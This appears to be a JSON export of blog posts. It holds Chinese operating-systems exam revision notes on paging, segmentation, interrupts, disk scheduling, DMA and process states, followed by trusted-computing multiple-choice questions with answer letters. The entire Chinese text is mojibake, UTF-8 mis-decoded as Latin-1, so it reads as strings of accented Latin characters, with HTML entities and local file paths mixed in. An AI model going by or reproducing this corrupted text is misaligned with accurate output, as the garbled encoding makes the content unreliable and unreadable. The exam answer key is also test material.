æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨é¡µé¢ç½®æ¢ç®—æ³•LRUï¼šæ·˜æ±°ç¦»å½“å‰æœ€è¿‘æ—¶é—´å†…ï¼Œæœ€ä¹…æ²¡ä½¿ç”¨è¿‡çš„é¡µé¢ ç†æƒ³å‹æ·˜æ±°OPTï¼šæ·˜æ±°åœ¨è®¿é—®ä¸²ä¸­å°†æ¥å†ä¹Ÿä¸å‡ºç°æˆ–æ˜¯åœ¨ç¦»å½“å‰æœ€è¿œçš„ä½ç½®ä¸Šå‡ºç°çš„é¡µé¢ã€‚ ä»€ä¹ˆæ˜¯æ®µå¼ç®¡ç†ï¼Ÿä¸é¡µå¼ç®¡ç†åŒºåˆ«ï¼Ÿ æ®µå¼ï¼š å°†ç¨‹åºæŒ‰ç…§å†…å®¹æˆ–è¿‡ç¨‹å…³ç³»åˆ†æˆæ®µï¼Œä»¥æ®µä¸ºå•ä½åˆ†é…å†…å­˜ï¼Œç„¶ååœ°å€æ˜ å°„æœºæ„æŠŠæ®µå¼è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºå®é™…çš„ç‰©ç†åœ°å€ã€‚ä¹Ÿæ˜¯å¸¸ç”¨çš„é©»ç•™å†…å­˜ï¼Œä¸å¸¸ç”¨çš„æ”¾åœ¨å¤–å­˜ã€‚ æ›´å¥½çš„æ»¡è¶³ç”¨æˆ·å¤šæ–¹é¢éœ€æ±‚ åŒºåˆ«ï¼š é¡µå¼ç®¡ç†æ˜¯æŒ‰ç…§çº¿æ€§ç©ºé—´é¡ºåºæ’åˆ—çš„ æ®µå¼æ˜¯æŒ‰ç…§å†…å®¹æˆ–è¿‡ç¨‹çš„å‡½æ•°å…³ç³»åˆ†æˆæ®µï¼Œæ˜¯ä¸€ä¸ªäºŒç»´çš„ æ®µå¼æœ‰å†…å¤–å­˜ç»Ÿä¸€ç®¡ç†çš„è™šå­˜å®ç°ï¼Œä½†æ˜¯æ¯æ¬¡äº¤æ¢çš„æ˜¯ä¸€æ®µæœ‰æ„ä¹‰çš„ä¿¡æ¯ã€‚ é¡µå¼äº¤æ¢å›ºå®šå¤§å°çš„é¡µï¼Œä¼šéœ€è¦å¤šæ¬¡ç¼ºé¡µä¸­æ–­ã€‚ æ®µå¼ç®¡ç†ï¼Œæ®µé•¿éœ€è¦åŠ¨æ€å¢é•¿ æ®µå¼ç®¡ç†ä¾¿äºæœ‰å®Œæ•´é€»è¾‘åŠŸèƒ½çš„ä¿¡æ¯æ®µå…±äº« æ®µå¼ç®¡ç†ä¾¿äºè¿›è¡ŒåŠ¨æ€é“¾æ¥ï¼Œé¡µå¼ç®¡ç†è¿›è¡ŒåŠ¨æ€é“¾æ¥å¾ˆå¤æ‚ æ®µå¼ç®¡ç†å¯ä»¥å®ç°è™šå­˜å—ï¼Ÿ å¯ä»¥ã€‚ä»¥æ®µä¸ºå•ä½åˆ†é…å†…å­˜ï¼Œé€šè¿‡åœ°å€æ˜ å°„æœºæ„æŠŠæ®µå¼è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºå®é™…ç‰©ç†åœ°å€ ä»€ä¹ˆæ˜¯æ®µé¡µå¼å­˜å‚¨ï¼Ÿ ç»“åˆé¡µå¼ç®¡ç†å’Œæ®µå¼ç®¡ç†å³å…·æœ‰åˆ†æ®µç³»ç»Ÿä¾¿äºå®ç°ï¼Œåˆ†æ®µå¯å…±äº«ã€æ˜“äºä¿æŠ¤ã€å¯åŠ¨æ€é“¾æ¥ç­‰ä¼˜ç‚¹ã€‚åˆæœ‰åˆ†é¡µï¼Œè§£å†³å†…å­˜çš„å¤–éƒ¨ç¢ç‰‡é—®é¢˜ éœ€è¦äº†è§£ä¸€ä¸‹ æ®µå¼ç®¡ç†æœ‰åˆ©äºåŠ¨æ€å¢é•¿ã€å…±äº«ã€å†…å­˜ä¿æŠ¤ã€‚é¡µå¼ç®¡ç†è§£å†³å†…å­˜å¤–éƒ¨ç¢ç‰‡é—®é¢˜ï¼Œæé«˜å†…å­˜åˆ©ç”¨ç‡ã€‚ æ®µé¡µå¼è®¿é—®æ—¶é—´é•¿ï¼Œæ‰§è¡Œæ•ˆç‡ä½ã€‚ å› ä¸ºåœ¨æ®µå¼çš„åŸºç¡€ä¸Šåˆ†é¡µï¼Œåªæ˜¯ä¸ºäº†å…‹æœç¢ç‰‡é—®é¢˜ï¼Œå¹¶æ²¡æœ‰æ”¹å˜æ®µå†…åœ°å€çš„ç»“æ„ã€‚ å­˜å–æŒ‡ä»¤æ—¶ï¼Œéœ€è¦å¯¹å†…å­˜è¿›è¡Œä¸‰æ¬¡ä»¥ä¸Šçš„è®¿é—®ï¼š1.ä»æ®µè¡¨ä¸­å–å‡ºå¯¹åº”çš„é¡µè¡¨åœ°å€ 2.è®¿é—®é¡µè¡¨å¾—åˆ°æ•°æ®æˆ–æŒ‡ä»¤çš„ç‰©ç†åœ°å€ 3. è®¿é—®ç‰©ç†å•å…ƒã€‚ é™ä½CPUæ‰§è¡ŒæŒ‡ä»¤çš„é€Ÿåº¦ ç¬¬å…­ç« ä»€ä¹ˆæ˜¯è½¯ä¸­æ–­ï¼ˆæ¦‚å¿µé¢˜ï¼Œè§£é‡Šé¢˜5åˆ†ï¼‰ï¼Ÿ è½¯ä¸­æ–­æ˜¯å¯¹ç¡¬ä»¶çš„ä¸€ç§æ¨¡æ‹Ÿ å‘é€è½¯ä¸­æ–­å°±æ˜¯å‘æ¥æ”¶è¿›ç¨‹çš„ä¸€ä¸ªç›¸åº”é¡¹å‘é€ä¸€ä¸ªç‰¹æ®Šä¿¡å· æ¥æ”¶åˆ°ä¿¡å·åï¼ŒæŒ‰ç…§äº‹å…ˆè§„å®šçš„åŒºæ‰§è¡Œä¸€ä¸ªè½¯ä¸­æ–­å¤„ç†ç¨‹åº æ”¶åˆ°ä¿¡å·åä¸ç«‹å³å¯åŠ¨ï¼Œè¦ç­‰åˆ°æ¥æ”¶è¿›ç¨‹æ‰§è¡Œæ—¶æ‰èƒ½ç”Ÿæ•ˆ å¯ä»¥å‘è‡ªå·±å‘è½¯ä¸­æ–­ä¿¡å· ç¬¬ä¸ƒç« ç®€è¿°è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†å†…å­˜åœ°å€çš„è½¬æ¢è¿‡ç¨‹(å¿…è€ƒï¼Œæœ‰ä¸ªè®¡ç®—é¢˜) æ¯ä¸ªè¿›ç¨‹å¯¹åº”ä¸€ä¸ªé¡µç›®å½•ï¼Œå½“æ“ä½œç³»ç»Ÿå¼€å§‹æ‰§è¡ŒæŸä¸€è¿›ç¨‹æ—¶ï¼Œç³»ç»Ÿä¼šè®¾ç½®å½“å‰è¿›ç¨‹æ‰€å¯¹åº”çš„é¡µç›®å½• ä¸€ä¸ªè¿›ç¨‹å¯æœ‰å¤šä¸ªé¡µè¡¨ï¼Œé€šè¿‡é¡µç›®å½•ç´¢å¼•ï¼Œå†…å­˜ç®¡ç†å™¨å¯å®šä½ç›¸åº”çš„è™šæ‹Ÿåœ°å€æ‰€å¯¹åº”çš„é¡µè¡¨ é€šè¿‡é¡µè¡¨å’Œé¡µè¡¨ç´¢å¼•ï¼Œå†…å­˜ç®¡ç†å™¨å¯å®šä½è™šæ‹Ÿåœ°å€å¯¹åº”çš„ç‰©ç†é¡µæ¡†å· å®šä½ç‰©ç†é¡µæ¡†å·åï¼Œé€šè¿‡å­—èŠ‚ç´¢å¼•ï¼Œå¯åˆ¤æ–­è™šæ‹Ÿåœ°å€å¯¹åº”çš„ç‰©ç†åœ°å€ é¡µè¡¨çš„ä½œç”¨ï¼šé€šè¿‡é¡µè¡¨æŸ¥åˆ°è™šæ‹Ÿåœ°å€çš„é¡µè¡¨å…¥å£ï¼Œå†é€šè¿‡è¯¥å…¥å£æŸ¥åˆ°è¯¥åœ°å€å¯¹åº”çš„ç‰©ç†åœ°å€ ç¬¬å…«ç« ç£ç›˜è°ƒåº¦ç®—æ³• å…ˆæ¥å…ˆæœåŠ¡ï¼ˆFCFSï¼‰ æ ¹æ®è¯·æ±‚çš„å…ˆåè¿›è¡Œè°ƒåº¦ æœ€çŸ­å¯»æ‰¾æ—¶é—´ä¼˜å…ˆï¼ˆSSTFï¼‰ scanï¼ˆç”µæ¢¯ç®—æ³•ï¼‰ ç§»åŠ¨åˆ°æœ€å¤–ä¾§ä¹‹åï¼Œå†å‘å†…ç§»åŠ¨ã€‚ Lookç®—æ³• åœ¨SCANçš„åŸºç¡€ä¸Šã€‚å¦‚æœåœ¨ç£ç›˜ç§»åŠ¨æ–¹å‘ä¸Šï¼Œæ²¡æœ‰å…¶ä»–è¯·æ±‚ï¼Œå°±ç«‹å³æ”¹å˜ç£å¤´æ–¹å‘ å¾ªç¯æ‰«æç®—æ³•ï¼ˆC-SCANï¼‰ åªå¤„ç†æŸä¸€å•ç‹¬æ–¹å‘ä¸Šçš„è¯·æ±‚ï¼Œè¿”å›æ—¶ç›´æ¥åˆ°å§‹ç«¯ï¼Œä¸å¤„ç†ä»»ä½•è¯·æ±‚ C-Lookç®—æ³• åœ¨C-SCANåŸºç¡€ä¸Šã€‚å¦‚æœåœ¨ç£ç›˜ç§»åŠ¨æ–¹å‘ä¸Šï¼Œæ²¡æœ‰å…¶ä»–è¯·æ±‚ï¼Œå°±ç«‹å³æ”¹å˜ç£å¤´æ–¹å‘ æ–‡ä»¶çš„ç‰©ç†ç»“æ„æœ‰å“ªå‡ ç§ï¼Ÿä¸ºä»€ä¹ˆä¸²è”ä¸é€‚äºéšæœºå­˜å–ï¼ˆé‡è¦ï¼‰ è¿ç»­æ–‡ä»¶ã€ä¸²è”æ–‡ä»¶ã€ç´¢å¼•æ–‡ä»¶ ä¸²è”ï¼šéè¿ç»­çš„ç‰©ç†å—å­˜æ”¾ä¿¡æ¯ï¼Œæ²¡æœ‰é¡ºåºå…³ç³»ã€‚æœç´¢æ—¶åªèƒ½æŒ‰é˜Ÿåˆ—ä¸­çš„ä¸²è”æŒ‡é’ˆé¡ºåºæœç´¢ã€‚ä¸é€‚ç”¨äºéšæœºå­˜å–ã€‚ ä»€ä¹ˆæ˜¯æ–‡ä»¶ç›®å½•ï¼Ÿæ–‡ä»¶ç›®å½•åŒ…å«å“ªäº›ä¿¡æ¯ï¼Ÿ æ–‡ä»¶ç›®å½•å®šä¹‰ &#x3D; æ–‡ä»¶å + å¯¹è¯¥æ–‡ä»¶å®æ–½æ§åˆ¶ç®¡ç†çš„è¯´æ˜ä¿¡æ¯ æ–‡ä»¶ç›®å½•å†…å®¹ &#x3D; æ–‡ä»¶å + æ–‡ä»¶å†…éƒ¨æ ‡è¯† + æ–‡ä»¶ä¿¡æ¯åœ¨å­˜å‚¨è®¾å¤‡ä¸Šç¬¬ä¸€ä¸ªç‰©ç†å—çš„åœ°å€ä¿¡æ¯ + æ–‡ä»¶é€»è¾‘ç»“æ„ã€ç‰©ç†ç»“æ„ã€å­˜å–æ§åˆ¶å’Œç®¡ç†ç­‰ äºŒçº§ç›®å½•å’Œå¤šçº§ç›®å½•çš„å¥½å¤„ï¼Ÿ å¯ä»¥å‡å°‘æ–‡ä»¶å‘½åå†²çª æé«˜æœç´¢é€Ÿåº¦ ç¬¦å·æ–‡ä»¶ç›®å½•è¡¨å’ŒåŸºæœ¬æ–‡ä»¶ç›®å½•è¡¨æ˜¯å®ç°æ–‡ä»¶å…±äº«çš„æ–¹æ³•ï¼Œä¸æ˜¯äºŒçº§ç›®å½• ç¬¬ä¹ç« DMA æ•°æ®ä¼ é€æ§åˆ¶æ–¹å¼æœ‰å“ªå‡ ç§ï¼Ÿ æœ‰ç¨‹åºç›´æ¥æ§åˆ¶æ³•ã€ä¸­æ–­æ§åˆ¶æ³•ã€DMAã€é€šé“æ–¹å¼ ç¨‹åºç›´æ¥æ§åˆ¶ï¼šç”¨æˆ·ç›´æ¥æ§åˆ¶å†…å­˜æˆ–CPUå’Œå¤–éƒ¨è®¾å¤‡çš„æ•°æ®ä¼ è¾“ã€‚ ä¼˜ç‚¹ï¼šæ§åˆ¶ç®€å•ï¼Œä¸éœ€è¦å¤ªå¤šç¡¬ä»¶æ”¯æŒ ç¼ºç‚¹ï¼šåªèƒ½ä¸²è¡Œå·¥ä½œï¼Œæ— æ³•å‘ç°é”™è¯¯ ä¸­æ–­I&#x2F;Oæ§åˆ¶ï¼šå‘CPUå‘é€ä¸­æ–­çš„æ–¹å¼æ§åˆ¶ä¼ é€ã€‚ ä¼˜ç‚¹ï¼šæé«˜CPUåˆ©ç”¨ç‡ï¼Œæ”¯æŒå¹¶è¡Œ ç¼ºç‚¹ï¼šæ•°æ®ç¼“å†²å¯„å­˜å™¨è¾ƒå°ï¼Œä¸­æ–­æ¬¡æ•°è¾ƒå¤šï¼Œå ç”¨CPUå¤§é‡æ—¶é—´ã€‚å¤–éƒ¨è®¾å¤‡å¤šæ—¶ï¼Œé€ æˆCPUä¸­æ–­ä¸¢å¤±ã€‚è®¾å¤‡å¿«ï¼Œå‡ºç°æ•°æ®ä¸¢å¤±ã€‚ DMAï¼šåœ¨å¤–éƒ¨è®¾å¤‡å’Œå†…å­˜ä¹‹é—´å¼€è¾Ÿç›´æ¥çš„æ•°æ®äº¤æ¢é€šè·¯è¿›è¡Œæ•°æ®ä¼ é€ã€‚ ä¼˜ç‚¹ï¼šé™¤äº†å¼€å§‹å’Œç»“æŸæ˜¯éœ€è¦CPUå¤„ç†ï¼Œå…¶ä»–æ—¶å€™ä¸éœ€è¦CPUçš„é¢‘ç¹å¹²æ¶‰ ç¼ºç‚¹ï¼šè®¾å¤‡å¤šæ—¶ï¼Œå¤šä¸ªDMAåŒæ—¶ä½¿ç”¨ä¼šå¼•èµ·å†…å­˜åœ°å€çš„å†²çª é€šé“æ–¹å¼ï¼š ä½¿ç”¨é€šé“æ¥æ§åˆ¶å†…å­˜æˆ–CPUå’Œå¤–éƒ¨è®¾å¤‡çš„æ•°æ®ä¼ é€ã€‚é€šé“æ˜¯ä¸€ä¸ªç‹¬ç«‹äºCPUçš„æœºæ„ï¼Œæœ‰è‡ªå·±çš„é€šé“æŒ‡ä»¤ã€‚å¯åŠ¨å’Œç»“æŸæ—¶éœ€è¦CPUã€‚ ä¼˜ç‚¹ï¼šå‡è½»CPUè´Ÿæ‹…ï¼Œå¢åŠ å¹¶è¡Œå·¥ä½œæˆéƒ½ ç¼ºç‚¹ï¼šå¢åŠ é¢å¤–ç¡¬ä»¶ï¼Œé€ ä»·é«˜ ä»€ä¹ˆæ˜¯é™·é˜±ï¼Ÿä»€ä¹ˆæ˜¯è½¯ä¸­æ–­ï¼Ÿç®€è¿°ä¸­æ–­ã€é™·é˜±ã€è½¯ä¸­æ–­ä¹‹é—´çš„å¼‚åŒï¼Ÿ é™·é˜±ï¼šå¤„ç†æœºå’Œå†…å­˜å†…éƒ¨äº§ç”Ÿçš„ä¸­æ–­ï¼ŒåŒ…æ‹¬ç¨‹åºè¿ç®—å¼•èµ·çš„å„è‡ªé”™è¯¯ã€‚ä¾‹å¦‚ï¼šå­˜å–è®¿é—®æ§åˆ¶é”™è¯¯ã€ç”¨æˆ·çŠ¶æ€åˆ‡æ¢é”™è¯¯ç­‰ ä¸­æ–­ï¼šåœ¨è®¡ç®—æœºæ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œå‡ºç°çš„æ€¥éœ€å¤„ç†çš„äº‹ä»¶ï¼Œè‡´ä½¿CPUæš‚æ—¶ä¸­æ–­æ­£åœ¨æ‰§è¡Œçš„ç¨‹åºï¼Œè½¬å»å¤„ç†ï¼Œå¤„ç†ç»“æŸåå†ç»§ç»­è¢«æ‰“æ–­çš„è¿›ç¨‹ã€‚ è½¯ä¸­æ–­ï¼šé€šä¿¡è¿›ç¨‹ä¹‹é—´ç”¨æ¥æ¨¡æ‹Ÿç¡¬ä¸­æ–­çš„ä¸€ç§ä¿¡å·é€šä¿¡æ–¹å¼ ä»€ä¹ˆæ˜¯ç¼“å†²ï¼Ÿ ç¼“å†²æ˜¯ä½¿ç”¨ä¸“ç”¨ç¡¬ä»¶ç¼“å†²å™¨ï¼Œæˆ–åœ¨å†…å­˜ä¸­åˆ’å‡ºä¸€ä¸ªåŒºåŸŸæš‚æ—¶å­˜æ”¾è¾“å…¥è¾“å‡ºæ•°æ®çš„å™¨ä»¶ã€‚ å¼•å…¥ç¼“å†²æ˜¯ä¸ºäº†åŒ¹é…å¤–è®¾å’ŒCPUä¹‹é—´çš„å¤„ç†é€Ÿåº¦ã€‚å‡å°‘ä¸­æ–­æ¬¡æ•°å’ŒCPUçš„ä¸­æ–­å¤„ç†æ—¶é—´ã€‚è§£å†³DMAæˆ–é€šé“æ–¹å¼æ—¶çš„æ•°æ®ä¼ è¾“ç“¶é¢ˆé—®é¢˜ã€‚ å®šä¹‰ã€æ¦‚å¿µç†è§£ç³»ç»Ÿè°ƒç”¨ï¼šæ“ä½œç³»ç»Ÿæä¾›ç»™ç¼–ç¨‹äººå‘˜çš„å”¯ä¸€æ¥å£ï¼Œå…¶æŒ‡ä»¤åœ¨æ ¸å¿ƒæ€ä¸‹æ‰§è¡Œã€‚ è¿›ç¨‹ï¼šä¸€ä¸ªç¨‹åºå¯¹æ•°æ®é›†çš„æ‰§è¡Œè¿‡ç¨‹ã€‚ å¹¶å‘ï¼š ä¸€ç»„åœ¨é€»è¾‘ä¸Šäº’ç›¸ç‹¬ç«‹çš„ç¨‹åºï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œæ—¶é—´ä¸Šäº’ç›¸é‡å ã€‚ å¹¶è¡Œï¼šä¸€ç»„ç¨‹åºæŒ‰ç‹¬ç«‹çš„ã€å¼‚å¸¸çš„é€Ÿåº¦æ‰§è¡Œ ä¸´ç•ŒåŒºï¼šä¸å…è®¸å¤šä¸ªå¹¶å‘è¿›ç¨‹äº¤å‰æ‰§è¡Œçš„ä¸€æ®µç¨‹åº æ­»é”ï¼šä¸€ç»„å¹¶å‘è¿›ç¨‹å› äº’ç›¸è¯·æ±‚å¯¹æ–¹æ‰€æ‹¥æœ‰çš„èµ„æºï¼Œåœ¨æ— å¤–åŠ›çš„æ¡ä»¶ä¸‹æ— æ³•ç»§ç»­æ‰§è¡Œçš„çŠ¶æ€ã€‚ è™šå­˜ï¼š ä¸€ä¸ªè¿›ç¨‹çš„ç›®æ ‡ä»£ç ä¸æ•°æ®çš„è™šæ‹Ÿåœ°å€ç»„æˆçš„ç©ºé—´ å¤§å°å—è®¡ç®—æœºåœ°å€ç»“æ„é™åˆ¶ è™šå­˜å®ç°çš„æ¡ä»¶ï¼šå†…å­˜ä¸­åªå­˜ç»å¸¸æ‰§è¡Œçš„æŒ‡ä»¤ï¼›è™šæ‹Ÿåœ°å€èƒ½ç”±æœºæ„è½¬æ¢æˆç‰©ç†åœ°å€ï¼›å¤–å­˜ä¸­çš„æ•°æ®èƒ½è¢«è°ƒå…¥å†…å­˜ã€‚ åŠ¨æ€åœ°å€é‡å®šä½ï¼š è®¾ç½®BRå’ŒVR å°†ç¨‹åºæ®µé¦–åœ°å€è£…å…¥BRä¸­ å°†æ‰€è¦è®¿é—®çš„è™šæ‹Ÿåœ°å€é€VR åœ°å€å˜æ¢æœºæ„æŠŠVRå’ŒBRå†…å®¹ç›¸åŠ å¾—å®é™…åœ°å€ æ•™æè€ƒç‚¹11é¡µ å›¾1.2 1.3 1.4 æŠ¢å å¼ è¿›ç¨‹çš„å®šä¹‰å’Œç‰¹å¾ï¼ˆä¸å®šé¡¹é€‰æ‹©ï¼‰ è¿›ç¨‹ï¼šè¿›ç¨‹æ˜¯è¿›ç¨‹å®ä½“çš„è¿è¡Œè¿‡ç¨‹ï¼Œæ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„ä¸€ä¸ªç‹¬ç«‹å•ä½ã€‚ è¿›ç¨‹å…·æœ‰ä»¥ä¸‹ç‰¹å¾ï¼š åŠ¨æ€æ€§ï¼šæœ‰ä¸€å®šçš„ç”Ÿå‘½æœŸ å¹¶å‘æ€§ï¼šå¤šä¸ªè¿›ç¨‹åŒå­˜äºå†…å­˜ä¸­ï¼Œåœ¨ä¸€æ®µæ—¶é—´å†…åŒæ—¶æ‰§è¡Œã€‚ ç‹¬ç«‹æ€§ï¼šè¿›ç¨‹æ˜¯èƒ½ç‹¬ç«‹è¿è¡Œã€åˆ†é…èµ„æºã€æ¥å—è°ƒåº¦çš„åŸºæœ¬å•ä½ å¼‚æ­¥æ€§ï¼šå¯æŒ‰å„è‡ªç‹¬ç«‹çš„ï¼Œä¸å¯é¢„çŸ¥çš„é€Ÿåº¦å‘å‰æ¨è¿›ã€‚ è¿›ç¨‹çš„çŠ¶æ€ è¿›ç¨‹çš„åŸºæœ¬çŠ¶æ€ï¼š å°±ç»ªçŠ¶æ€ï¼šå·²è·å¾—é™¤CPUä»¥å¤–çš„æ‰€æœ‰å¿…è¦èµ„æºï¼Œå¾—å€’CPUå°±å¯ç«‹å³æ‰§è¡Œ æ‰§è¡ŒçŠ¶æ€ï¼šå·²å¾—åˆ°CPUï¼Œæ­£åœ¨æ‰§è¡Œ é˜»å¡çŠ¶æ€ï¼šæ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹ï¼Œå› æŸç§äº‹ä»¶è€Œæš‚æ—¶æ— æ³•ç»§ç»­æ‰§è¡Œï¼Œç­‰ç›¸åº”äº‹ä»¶å®Œæˆåï¼Œæ‰èƒ½å»ç«äº‰CPU è¿›ç¨‹çš„æŒ‚èµ·ï¼š ä½¿è¿›ç¨‹ä¸èƒ½ç»§ç»­æ‰§è¡Œï¼Œå³ä½¿å¤„äºå°±ç»ªçŠ¶æ€ä¹Ÿä¸èƒ½ç«äº‰CPU 3çŠ¶æ€ã€5çŠ¶æ€ã€7çŠ¶æ€ã€‚æŒ‚èµ·ç­‰â€¦åŸºæœ¬çŠ¶æ€ä¸è½¬æ¢ã€ä¸è€ƒå¤§é¢˜ åè¯è§£é‡Šæˆ–è€…é€‰æ‹©é¢˜ã€‚ã€‘ è¿›ç¨‹æ§åˆ¶å— è¿›ç¨‹çš„åˆ›å»º ![æ“ä½œç³»ç»Ÿ-30](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;æ“ä½œç³»ç»Ÿè€ƒç‚¹&#x2F;æ“ä½œç³»ç»Ÿè€ƒç‚¹ 7b60f113764c4024a9bf7b9399c686ab&#x2F;æ“ä½œç³»ç»Ÿ-30.png) è¿›ç¨‹çš„ç»ˆæ­¢ è¿›ç¨‹çš„é˜»å¡å’Œå”¤é†’ è¿›ç¨‹çš„æŒ‚èµ·ä¸æ¿€æ´» è¿›ç¨‹åŒæ­¥çš„åŸºæœ¬æ¦‚å¿µ ä¸¤ç§å½¢å¼çš„åˆ¶çº¦å…³ç³» ä¸´ç•Œèµ„æºå’Œä¸´ç•ŒåŒº åŒæ­¥æœºåˆ¶åº”éµå¾ªçš„è§„åˆ™ ä¿¡å·é‡æœºåˆ¶ï¼ˆè¦æ¶‰åŠåˆ°å¤§é¢˜ï¼Œå†™pvæºè¯­ï¼‰ ä¿¡å·é‡çš„åº”ç”¨ï¼ˆé€‰æ‹©é¢˜ï¼‰ ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜ å“²å­¦å®¶è¿›é¤é—®é¢˜ è¯»å†™é—®é¢˜ çº¿ç¨‹çš„åŸºæœ¬æ¦‚å¿µï¼ˆå¡«ç©ºé€‰æ‹©ï¼‰ çº¿ç¨‹çš„æ§åˆ¶ï¼ˆå¡«ç©ºé€‰æ‹©ï¼‰ ![æ“ä½œç³»ç»Ÿ-48](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;æ“ä½œç³»ç»Ÿè€ƒç‚¹&#x2F;æ“ä½œç³»ç»Ÿè€ƒç‚¹ 7b60f113764c4024a9bf7b9399c686ab&#x2F;æ“ä½œç³»ç»Ÿ-48.png) è¿›ç¨‹çš„åŸºæœ¬æ¦‚å¿µ è¿›ç¨‹åŒæ­¥çš„åŸºæœ¬æ¦‚å¿µ ä¿¡å·é‡æœºåˆ¶åŠå…¶åº”ç”¨ çº¿ç¨‹çš„åŸºæœ¬æ¦‚å¿µ æ¯”è¾ƒè¿›ç¨‹ä¸ç¨‹åºçš„å¼‚åŒ PCBçš„ä½œç”¨ï¼Ÿä¸ºä»€ä¹ˆè¯´PCBæ˜¯è¿›ç¨‹å­˜åœ¨çš„å”¯ä¸€æ ‡å¿—ï¼Ÿ ä¸ºä»€ä¹ˆè¯¸è¿›ç¨‹å¯¹ä¸´ç•Œèµ„æºçš„è®¿é—®å¿…é¡»äº’æ–¥ï¼Ÿ ä½•è°“â€œå¿™ç­‰â€ï¼Ÿå®ƒæœ‰ä»€ä¹ˆç¼ºç‚¹ï¼Ÿ ç”Ÿäº§è€…ã€æ¶ˆè´¹è€…é—®é¢˜ ä»€ä¹ˆæ˜¯ç¼“å†² pvåŸè¯­é€‰æ‹©ä¹‹ä¸€ ç‹¬æœ¨æ¡¥é—®é¢˜ è¯·ç”¨ä¿¡å·é‡è§£å†³ å¤„ç†æ­»é” ä¸­æ–­æ–¹å¼I&#x2F;Oå’ŒDMAåŒºåˆ« PPTä¸Šä¹ é¢˜ è‹¥TLBå‘½ä¸­ï¼Œåˆ™Pageå¿…å‘½ä¸­","categories":[{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"æ“ä½œç³»ç»Ÿ","slug":"æœŸæœ«è€ƒè¯•/æ“ä½œç³»ç»Ÿ","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"å¯ä¿¡è®¡ç®—æœŸæœ«è€ƒç‚¹","slug":"å¯ä¿¡è®¡ç®—æœŸæœ«è€ƒç‚¹","date":"2021-01-21T15:09:36.000Z","updated":"2024-11-12T07:00:12.000Z","comments":true,"path":"2021/01/21/å¯ä¿¡è®¡ç®—æœŸæœ«è€ƒç‚¹/","permalink":"https://gryffinbit.top/2021/01/21/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97%E6%9C%9F%E6%9C%AB%E8%80%83%E7%82%B9/","excerpt":"","text":"è€ƒå·é€‰æ‹©é¢˜1. ä¸‹åˆ—å“ªä¸€ä¸ªä¸ºèº«ä»½è®¤è¯å¯†é’¥çš„è‹±æ–‡ç®€å†™ï¼ˆBï¼‰ A.EK B.AIK C.LK D.AK 2.ä¸‹åˆ—å“ªä¸€ä¸ªä¸æ˜¯é™æ€ä¿¡ä»»é“¾çš„è¿è¡Œç‰¹ç‚¹( D ) A.ä»¥CRTMä¸ºå¯ä¿¡æ ¹ B.å¹³å°çš„ä¸€æ¬¡è¿è¡Œå¯¹åº”äºä¸€ä¸ªä¿¡ä»»é“¾ï¼Œä¸€ä¸ªèµ·ç‚¹ä¸€ä¸ªç»ˆç‚¹ C.ä¸€æ—¦å¹³å°è¿›å…¥ä¸å¯ä¿¡çŠ¶æ€ï¼Œä»ä¿¡ä»»é“¾è§’åº¦ï¼Œå¹³å°ä»¥åçš„æ‰€æœ‰çŠ¶æ€éƒ½æ˜¯ä¸å¯ä¿¡çš„ D.ä¸»è¦é‡‡ç”¨DRTMæŠ€æœ¯ 3.è¿œç¨‹è¯æ˜è¿‡ç¨‹ä¸åŒ…æ‹¬å“ªä¸ªé˜¶æ®µï¼ˆ D ï¼‰ A .å®Œæ•´æ€§åº¦é‡ B.å®Œæ•´æ€§æŠ¥å‘Š C å®Œæ•´æ€§æµ‹è¯„ D å®Œæ•´æ€§éªŒè¯ 4.ä¸‹é¢å“ªä¸ªä¸æ˜¯å¯ä¿¡è®¡ç®—å¹³å°çš„å¯ä¿¡æ ¹ï¼ˆ C ï¼‰ A.å¯ä¿¡åº¦é‡æ ¹ B.å¯ä¿¡æŠ¥å‘Šæ ¹ C.å¯ä¿¡åé¦ˆæ ¹ D.å¯ä¿¡å­˜å‚¨æ ¹ 5.åŸºäºä¿¡ä»»é“¾çš„å¯ä¿¡è®¡ç®—æœºæ¨¡å—çš„å¯åŠ¨é¡ºåºæ˜¯ï¼ˆ B ï¼‰ A.è¡Œä¸ºç›‘æµ‹æ¨¡å—â€”èº«ä»½è®¤è¯æ¨¡å—â€”åŠ å¯†æ¨¡å—â€”æ•°å­—ç­¾åæ¨¡å—BIOS B.èº«ä»½è®¤è¯æ¨¡å—â€”è¡Œä¸ºç›‘æµ‹æ¨¡å—â€”åŠ å¯†æ¨¡å—â€”æ•°å­—ç­¾åæ¨¡å—BIOS C.è¡Œä¸ºæ£€æµ‹æ¨¡å—â€”åŠ å¯†æ¨¡å—â€”èº«ä»½è®¤è¯æ¨¡å—â€”æ•°å­—ç­¾åæ¨¡å—BIOS D.èº«ä»½è®¤è¯æ¨¡å—â€”åŠ å¯†æ¨¡å—â€”è¡Œä¸ºç›‘æµ‹æ¨¡å—â€”æ•°å­—ç­¾åæ¨¡å—BIOS 6.ä¿¡ä»»ä¸å¯ä»¥æ˜¯ï¼ˆCï¼‰çš„å…³ç³» A.ä¸€å¯¹ä¸€ B.ä¸€å¯¹å¤š C.å¤šå¯¹ä¸€ D.å¤šå¯¹å¤š 